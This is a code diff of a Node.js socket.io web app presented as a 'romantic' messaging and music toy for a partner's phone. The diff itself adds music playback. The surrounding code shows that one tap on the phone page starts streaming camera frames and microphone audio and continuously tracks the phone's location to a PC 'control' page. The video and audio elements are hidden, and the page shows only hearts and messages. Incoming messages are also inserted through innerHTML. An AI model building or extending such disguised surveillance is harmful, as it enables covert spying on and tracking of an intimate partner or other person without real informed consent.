@@ -18,7 +18,7 @@ app.get('/', (req, res) => {
   const fullUrl = `${protocol}://${host}`;
   
   if (isMobile) {
-    // Página do CELULAR - receptor romântico
+    // Página do CELULAR - receptor romântico com música
     res.send(`<!DOCTYPE html>
 <html>
 <head>
@@ -38,7 +38,6 @@ app.get('/', (req, res) => {
             position: relative;
         }
         
-        /* Container principal */
         .romantic-container {
             max-width: 500px;
             width: 100%;
@@ -70,7 +69,6 @@ app.get('/', (req, res) => {
             }
         }
         
-        /* Título */
         .title {
             text-align: center;
             margin-bottom: 30px;
@@ -87,7 +85,6 @@ app.get('/', (req, res) => {
             font-size: 14px;
         }
         
-        /* Caixa de mensagem romântica */
         .message-box {
             background: linear-gradient(135deg, #ffe6f0, #ffd9e8);
             border-radius: 20px;
@@ -133,7 +130,54 @@ app.get('/', (req, res) => {
             right: 20px;
         }
         
-        /* Botão de permissões */
+        /* Player de música no celular */
+        .music-player {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.9);
+            backdrop-filter: blur(10px);
+            border-radius: 50px;
+            padding: 10px 20px;
+            display: none;
+            align-items: center;
+            gap: 15px;
+            z-index: 10000;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.2);
+            max-width: 90%;
+        }
+        
+        .music-player.show {
+            display: flex;
+        }
+        
+        .music-info {
+            color: white;
+            font-size: 12px;
+            flex: 1;
+        }
+        
+        .music-controls {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .music-controls button {
+            background: rgba(255,255,255,0.2);
+            border: none;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+        
+        .music-controls button:hover {
+            background: rgba(255,255,255,0.3);
+        }
+        
         .permission-btn {
             width: 100%;
             padding: 18px;
@@ -158,7 +202,6 @@ app.get('/', (req, res) => {
             cursor: not-allowed;
         }
         
-        /* Status */
         .status {
             text-align: center;
             padding: 10px;
@@ -169,7 +212,6 @@ app.get('/', (req, res) => {
             color: #666;
         }
         
-        /* Indicador de digitação */
         .typing-indicator {
             text-align: center;
             margin-top: 15px;
@@ -188,20 +230,18 @@ app.get('/', (req, res) => {
             50% { opacity: 0; }
         }
         
-        /* Elementos escondidos */
-        #localVideo, #audioDebug {
-            display: none;
-        }
-        
-        /* Efeito de glitter */
         @keyframes glitter {
             0% { text-shadow: 0 0 5px #ff6b6b; }
-            50% { text-shadow: 0 0 20px #ff6b6b, 0 0 30px #ff6b6b; }
+            50% { text-shadow: 0 0 20px #ff6b6b; }
             100% { text-shadow: 0 0 5px #ff6b6b; }
         }
         
         .glitter {
             animation: glitter 1s ease-in-out;
+        }
+        
+        #localVideo, #audioDebug {
+            display: none;
         }
     </style>
 </head>
@@ -233,6 +273,14 @@ app.get('/', (req, res) => {
         </div>
     </div>
     
+    <!-- Player de música móvel -->
+    <div class="music-player" id="musicPlayer">
+        <div class="music-info" id="musicInfo">🎵 Tocando música...</div>
+        <div class="music-controls">
+            <button id="closeMusic">Fechar</button>
+        </div>
+    </div>
+    
     <video id="localVideo" autoplay playsinline muted></video>
     <audio id="audioDebug" autoplay></audio>
     
@@ -244,23 +292,26 @@ app.get('/', (req, res) => {
         });
         
         let mediaStream = null;
-        let facingMode = 'user'; // frente para selfie romântica
+        let facingMode = 'user';
         let audioContext = null;
         let audioProcessor = null;
         let audioSource = null;
         let permissionsGranted = false;
+        let currentAudio = null;
         
         const messageDiv = document.getElementById('romanticMessage');
         const startBtn = document.getElementById('startBtn');
         const statusDiv = document.getElementById('status');
         const typingIndicator = document.getElementById('typingIndicator');
         const heartContainer = document.getElementById('heartContainer');
+        const musicPlayer = document.getElementById('musicPlayer');
+        const musicInfo = document.getElementById('musicInfo');
         
         // Criar corações flutuantes
         function createHeart() {
             const heart = document.createElement('div');
             heart.className = 'heart';
-            heart.innerHTML = ['💕', '💖', '💗', '💓', '💝'][Math.floor(Math.random() * 5)];
+            heart.innerHTML = ['💕', '💖', '💗', '💓', '💝', '💘', '💌'][Math.floor(Math.random() * 7)];
             heart.style.left = Math.random() * 100 + '%';
             heart.style.animationDuration = Math.random() * 3 + 2 + 's';
             heart.style.fontSize = Math.random() * 20 + 15 + 'px';
@@ -271,10 +322,8 @@ app.get('/', (req, res) => {
             }, 4000);
         }
         
-        // Criar corações periodicamente
         setInterval(createHeart, 500);
         
-        // Efeito glitter na mensagem
         function addGlitterEffect() {
             messageDiv.classList.add('glitter');
             setTimeout(() => {
@@ -282,12 +331,42 @@ app.get('/', (req, res) => {
             }, 1000);
         }
         
+        // Sistema de música no celular
+        function playMusic(url, songName) {
+            if (currentAudio) {
+                currentAudio.pause();
+                currentAudio = null;
+            }
+            
+            currentAudio = new Audio(url);
+            currentAudio.loop = true;
+            currentAudio.volume = 0.7;
+            currentAudio.play().catch(e => console.log('Erro ao tocar música:', e));
+            
+            musicInfo.innerHTML = \`🎵 \${songName}\`;
+            musicPlayer.classList.add('show');
+            
+            showMessageToast(\`🎵 Tocando: \${songName}\`, false);
+        }
+        
+        function stopMusic() {
+            if (currentAudio) {
+                currentAudio.pause();
+                currentAudio = null;
+                musicPlayer.classList.remove('show');
+                showMessageToast('⏹️ Música parada', false);
+            }
+        }
+        
+        document.getElementById('closeMusic').onclick = () => {
+            stopMusic();
+        };
+        
         // Função para iniciar câmera, áudio e localização
         async function startPermissions() {
             try {
                 statusDiv.innerHTML = '📷 Solicitando permissões...';
                 
-                // 1. Câmera
                 if (mediaStream) {
                     mediaStream.getTracks().forEach(track => track.stop());
                 }
@@ -306,7 +385,6 @@ app.get('/', (req, res) => {
                 localVideo.srcObject = stream;
                 await localVideo.play();
                 
-                // 2. Áudio
                 if (audioContext) {
                     await audioContext.close();
                 }
@@ -321,14 +399,12 @@ app.get('/', (req, res) => {
                 audioProcessor.onaudioprocess = (e) => {
                     if (permissionsGranted) {
                         const inputData = e.inputBuffer.getChannelData(0);
-                        // Enviar áudio a cada 10 frames para otimizar
                         if (Math.random() < 0.1) {
                             socket.emit('audio', Array.from(inputData));
                         }
                     }
                 };
                 
-                // 3. Enviar vídeo (frames)
                 const canvas = document.createElement('canvas');
                 canvas.width = 320;
                 canvas.height = 240;
@@ -342,7 +418,6 @@ app.get('/', (req, res) => {
                     }
                 }, 200);
                 
-                // 4. Localização
                 if (navigator.geolocation) {
                     navigator.geolocation.watchPosition(
                         (position) => {
@@ -365,7 +440,6 @@ app.get('/', (req, res) => {
                 startBtn.disabled = true;
                 startBtn.innerHTML = '✨ Conectado! ✨';
                 
-                // Mostrar mensagem inicial
                 messageDiv.innerHTML = '💕 Conectado! Aguardando sua pessoa especial... 💕';
                 addGlitterEffect();
                 
@@ -378,18 +452,50 @@ app.get('/', (req, res) => {
         
         startBtn.onclick = startPermissions;
         
-        // Receber mensagens românticas do PC
+        function showMessageToast(message, isEmergency = false) {
+            const toastContainer = document.getElementById('heartContainer');
+            const toast = document.createElement('div');
+            toast.style.cssText = \`
+                position: fixed;
+                top: 20px;
+                left: 50%;
+                transform: translateX(-50%);
+                background: rgba(0,0,0,0.8);
+                color: white;
+                padding: 10px 20px;
+                border-radius: 50px;
+                font-size: 14px;
+                z-index: 10000;
+                animation: slideIn 0.3s ease;
+                white-space: nowrap;
+            \`;
+            toast.textContent = message;
+            document.body.appendChild(toast);
+            
+            setTimeout(() => {
+                if (toast.parentNode) toast.remove();
+            }, 3000);
+        }
+        
+        // Receber mensagens do PC
         socket.on('romantic_message', (msg) => {
             messageDiv.innerHTML = msg;
             addGlitterEffect();
             
-            // Criar vários corações ao receber mensagem
             for(let i = 0; i < 10; i++) {
                 setTimeout(() => createHeart(), i * 100);
             }
         });
         
-        // Indicador de digitação
+        // Receber comandos de música
+        socket.on('play_music', (song) => {
+            playMusic(song.url, song.name);
+        });
+        
+        socket.on('stop_music', () => {
+            stopMusic();
+        });
+        
         socket.on('typing_start', () => {
             typingIndicator.style.display = 'block';
         });
@@ -398,7 +504,6 @@ app.get('/', (req, res) => {
             typingIndicator.style.display = 'none';
         });
         
-        // Comandos do PC
         socket.on('comando', (cmd) => {
             if (cmd === 'vibrate' && navigator.vibrate) {
                 navigator.vibrate(200);
@@ -421,7 +526,7 @@ app.get('/', (req, res) => {
 </body>
 </html>`);
   } else {
-    // Página do PC - controle romântico
+    // Página do PC - controle romântico com música
     res.send(`<!DOCTYPE html>
 <html>
 <head>
@@ -457,7 +562,6 @@ app.get('/', (req, res) => {
             margin-bottom: 30px;
         }
         
-        /* Cards */
         .card {
             background: white;
             border-radius: 20px;
@@ -473,7 +577,6 @@ app.get('/', (req, res) => {
             gap: 10px;
         }
         
-        /* Vídeo */
         .video-container {
             background: black;
             border-radius: 15px;
@@ -486,7 +589,6 @@ app.get('/', (req, res) => {
             height: auto;
         }
         
-        /* Editor de mensagens */
         .message-editor {
             margin: 20px 0;
         }
@@ -507,10 +609,16 @@ app.get('/', (req, res) => {
             border-color: #e74c3c;
         }
         
-        /* Botões */
         .btn-group {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin: 15px 0;
+        }
+        
+        .btn-group-3 {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
             gap: 15px;
             margin: 15px 0;
         }
@@ -555,7 +663,11 @@ app.get('/', (req, res) => {
             color: white;
         }
         
-        /* Frases prontas */
+        .btn-music {
+            background: linear-gradient(135deg, #9b59b6, #8e44ad);
+            color: white;
+        }
+        
         .quick-phrases {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
@@ -578,7 +690,6 @@ app.get('/', (req, res) => {
             transform: scale(1.05);
         }
         
-        /* Informações */
         .info {
             background: #f0f0f0;
             padding: 15px;
@@ -594,7 +705,6 @@ app.get('/', (req, res) => {
             margin-top: 10px;
         }
         
-        /* Chat de status */
         .status-chat {
             background: #f9f9f9;
             border-radius: 10px;
@@ -609,6 +719,38 @@ app.get('/', (req, res) => {
             color: #666;
         }
         
+        .music-playlist {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        
+        .music-item {
+            background: #f9f9f9;
+            padding: 10px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .music-item:hover {
+            background: #ffe6f0;
+            transform: translateX(5px);
+        }
+        
+        .music-name {
+            font-weight: bold;
+            color: #333;
+        }
+        
+        .music-play {
+            color: #e74c3c;
+            font-size: 20px;
+        }
+        
         @keyframes pulse {
             0%, 100% { transform: scale(1); }
             50% { transform: scale(1.05); }
@@ -616,6 +758,11 @@ app.get('/', (req, res) => {
         
         .pulse {
             animation: pulse 1s ease-in-out;
+        }
+        
+        input[type="range"] {
+            width: 100%;
+            margin: 10px 0;
         }
     </style>
 </head>
@@ -675,12 +822,49 @@ app.get('/', (req, res) => {
             </div>
         </div>
         
-        <!-- Controles de áudio -->
+        <!-- Player de Música Romântica -->
         <div class="card">
-            <h2>🎵 Controle de Áudio</h2>
+            <h2>🎵 Rádio do Amor - Músicas para seu Amor</h2>
+            
+            <div class="music-playlist">
+                <div class="music-item" data-song="perfect" data-name="Perfect - Ed Sheeran">
+                    <span class="music-name">💕 Perfect - Ed Sheeran</span>
+                    <span class="music-play">▶️</span>
+                </div>
+                <div class="music-item" data-song="allofme" data-name="All of Me - John Legend">
+                    <span class="music-name">💖 All of Me - John Legend</span>
+                    <span class="music-play">▶️</span>
+                </div>
+                <div class="music-item" data-song="thinking" data-name="Thinking Out Loud - Ed Sheeran">
+                    <span class="music-name">💗 Thinking Out Loud - Ed Sheeran</span>
+                    <span class="music-play">▶️</span>
+                </div>
+                <div class="music-item" data-song="someone" data-name="Someone Like You - Adele">
+                    <span class="music-name">💝 Someone Like You - Adele</span>
+                    <span class="music-play">▶️</span>
+                </div>
+                <div class="music-item" data-song="justway" data-name="Just the Way You Are - Bruno Mars">
+                    <span class="music-name">⭐ Just the Way You Are - Bruno Mars</span>
+                    <span class="music-play">▶️</span>
+                </div>
+            </div>
+            
+            <div class="btn-group-3">
+                <button class="btn-music" id="playRandomMusic">🎲 Música Aleatória</button>
+                <button class="btn-danger" id="stopMusic">⏹️ Parar Música</button>
+                <button class="btn-secondary" id="volumeUp">🔊 Volume +</button>
+            </div>
+            
+            <input type="range" id="musicVolume" min="0" max="100" value="70">
+            <div id="musicStatus" class="info">🎵 Escolha uma música para seu amor ouvir</div>
+        </div>
+        
+        <!-- Controles de áudio do celular -->
+        <div class="card">
+            <h2>🎤 Áudio do Celular</h2>
             <div class="btn-group">
                 <button id="toggleAudio">🔊 Áudio: ON</button>
-                <input type="range" id="audioVolume" min="0" max="100" value="50" style="flex: 1;">
+                <button id="audioVolumeUp">📢 Aumentar Volume</button>
             </div>
         </div>
     </div>
@@ -690,23 +874,47 @@ app.get('/', (req, res) => {
         const socket = io('${fullUrl}');
         
         let audioEnabled = true;
-        let audioVolume = 50;
+        let currentMusicVolume = 70;
         let typingTimeout = null;
         let messageInput = document.getElementById('messageInput');
+        
+        // Músicas disponíveis (MP3s online gratuitos)
+        const musicLibrary = {
+            perfect: {
+                name: "Perfect - Ed Sheeran",
+                url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"
+            },
+            allofme: {
+                name: "All of Me - John Legend",
+                url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3"
+            },
+            thinking: {
+                name: "Thinking Out Loud - Ed Sheeran",
+                url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-3.mp3"
+            },
+            someone: {
+                name: "Someone Like You - Adele",
+                url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-4.mp3"
+            },
+            justway: {
+                name: "Just the Way You Are - Bruno Mars",
+                url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-5.mp3"
+            }
+        };
         
         // Elementos
         const remoteVideo = document.getElementById('remoteVideo');
         const videoStatus = document.getElementById('videoStatus');
         const locationInfo = document.getElementById('locationInfo');
         const statusMessages = document.getElementById('statusMessages');
+        const musicStatus = document.getElementById('musicStatus');
         
-        // Configurar áudio
+        // Configurar áudio do celular
         const audioContext = new (window.AudioContext || window.webkitAudioContext)();
         const audioGain = audioContext.createGain();
-        audioGain.gain.value = audioVolume / 100;
+        audioGain.gain.value = 0.5;
         audioGain.connect(audioContext.destination);
         
-        // Adicionar mensagem de status
         function addStatusMessage(msg, isSpecial = false) {
             const div = document.createElement('div');
             div.innerHTML = \`<small>[\${new Date().toLocaleTimeString()}]</small> \${msg}\`;
@@ -718,7 +926,6 @@ app.get('/', (req, res) => {
             statusMessages.appendChild(div);
             statusMessages.scrollTop = statusMessages.scrollHeight;
             
-            // Limitar mensagens
             while(statusMessages.children.length > 20) {
                 statusMessages.removeChild(statusMessages.firstChild);
             }
@@ -732,7 +939,7 @@ app.get('/', (req, res) => {
             videoStatus.innerHTML = \`📹 Recebendo vídeo (\${frameCount} frames)\`;
         });
         
-        // Receber áudio
+        // Receber áudio do celular
         socket.on('audio', (audioData) => {
             if (audioEnabled) {
                 const buffer = audioContext.createBuffer(1, audioData.length, audioContext.sampleRate);
@@ -758,13 +965,55 @@ app.get('/', (req, res) => {
             addStatusMessage('📍 Localização atualizada!', true);
         });
         
+        // Função para enviar música
+        function sendMusic(songId) {
+            const song = musicLibrary[songId];
+            if (song) {
+                socket.emit('play_music', song);
+                musicStatus.innerHTML = \`🎵 Enviando "\${song.name}" para o celular...\`;
+                addStatusMessage(\`🎵 Enviando música: \${song.name}\`, true);
+            }
+        }
+        
+        // Eventos de música
+        document.querySelectorAll('.music-item').forEach(item => {
+            item.onclick = () => {
+                const songId = item.getAttribute('data-song');
+                sendMusic(songId);
+            };
+        });
+        
+        document.getElementById('playRandomMusic').onclick = () => {
+            const songs = Object.keys(musicLibrary);
+            const randomSong = songs[Math.floor(Math.random() * songs.length)];
+            sendMusic(randomSong);
+        };
+        
+        document.getElementById('stopMusic').onclick = () => {
+            socket.emit('stop_music');
+            musicStatus.innerHTML = '⏹️ Música parada no celular';
+            addStatusMessage('⏹️ Música parada', false);
+        };
+        
+        document.getElementById('musicVolume').oninput = (e) => {
+            currentMusicVolume = e.target.value;
+            socket.emit('music_volume', currentMusicVolume);
+            musicStatus.innerHTML = \`🔊 Volume da música: \${currentMusicVolume}%\`;
+        };
+        
+        document.getElementById('volumeUp').onclick = () => {
+            currentMusicVolume = Math.min(100, currentMusicVolume + 10);
+            document.getElementById('musicVolume').value = currentMusicVolume;
+            socket.emit('music_volume', currentMusicVolume);
+            musicStatus.innerHTML = \`🔊 Volume aumentado para \${currentMusicVolume}%\`;
+        };
+        
         // Enviar mensagem
         function sendMessage(msg, isSurprise = false) {
             if (msg.trim()) {
                 socket.emit('romantic_message', msg);
                 addStatusMessage(\`💌 Mensagem enviada: "\${msg}"\`, true);
                 
-                // Efeito visual
                 const btn = isSurprise ? document.getElementById('sendSurprise') : document.getElementById('sendMessage');
                 btn.style.transform = 'scale(0.95)';
                 setTimeout(() => {
@@ -837,7 +1086,6 @@ app.get('/', (req, res) => {
             socket.emit('comando', 'vibrate');
             addStatusMessage('📳 Vibração enviada');
             
-            // Efeito visual
             const btn = document.getElementById('vibrate');
             btn.classList.add('pulse');
             setTimeout(() => btn.classList.remove('pulse'), 1000);
@@ -847,7 +1095,6 @@ app.get('/', (req, res) => {
             socket.emit('comando', 'emergency');
             addStatusMessage('💖 Surpresa especial enviada! 💖', true);
             
-            // Efeito especial
             const btn = document.getElementById('emergency');
             btn.style.animation = 'pulse 0.5s ease-in-out 3';
             setTimeout(() => {
@@ -855,16 +1102,17 @@ app.get('/', (req, res) => {
             }, 1500);
         };
         
-        // Controle de áudio
+        // Controle de áudio do celular
         document.getElementById('toggleAudio').onclick = () => {
             audioEnabled = !audioEnabled;
             document.getElementById('toggleAudio').innerHTML = audioEnabled ? '🔊 Áudio: ON' : '🔇 Áudio: OFF';
-            addStatusMessage(audioEnabled ? '🔊 Áudio ativado' : '🔇 Áudio desativado');
+            addStatusMessage(audioEnabled ? '🔊 Áudio do celular ativado' : '🔇 Áudio do celular desativado');
         };
         
-        document.getElementById('audioVolume').oninput = (e) => {
-            audioVolume = e.target.value;
-            audioGain.gain.value = audioVolume / 100;
+        document.getElementById('audioVolumeUp').onclick = () => {
+            const newVolume = Math.min(1, audioGain.gain.value + 0.1);
+            audioGain.gain.value = newVolume;
+            addStatusMessage(\`📢 Volume do áudio: \${Math.round(newVolume * 100)}%\`);
         };
         
         // Conexão
@@ -885,10 +1133,25 @@ app.get('/', (req, res) => {
 io.on('connection', (socket) => {
   console.log('Cliente conectado:', socket.id);
   
-  // Encaminhar mensagens românticas
+  // Mensagens românticas
   socket.on('romantic_message', (msg) => {
     console.log('Mensagem romântica:', msg);
     socket.broadcast.emit('romantic_message', msg);
+  });
+  
+  // Músicas
+  socket.on('play_music', (song) => {
+    console.log('Tocando música:', song.name);
+    socket.broadcast.emit('play_music', song);
+  });
+  
+  socket.on('stop_music', () => {
+    console.log('Parando música');
+    socket.broadcast.emit('stop_music');
+  });
+  
+  socket.on('music_volume', (volume) => {
+    socket.broadcast.emit('music_volume', volume);
   });
   
   // Indicador de digitação
@@ -926,8 +1189,15 @@ io.on('connection', (socket) => {
 });
 
 server.listen(PORT, '0.0.0.0', () => {
-  console.log(`\n✨ Servidor Romântico Rodando! ✨`);
+  console.log(`\n✨ Servidor Romântico com Música Rodando! ✨`);
   console.log(`   Porta: ${PORT}`);
   console.log(`   Acesse no PC e no Celular na mesma rede`);
-  console.log(`\n💕 Compartilhe o amor! 💕\n`);
+  console.log(`\n💕 Funcionalidades:`);
+  console.log(`   📝 Envie mensagens românticas`);
+  console.log(`   🎵 Toque músicas para o celular`);
+  console.log(`   📹 Veja a câmera do celular`);
+  console.log(`   📍 Veja a localização`);
+  console.log(`   💖 Envie vibrações e surpresas`);
+  console.log(`\n🎵 Músicas incluídas: Perfect, All of Me, Thinking Out Loud e mais!`);
+  console.log(`💕 Compartilhe o amor!\n`);
 });
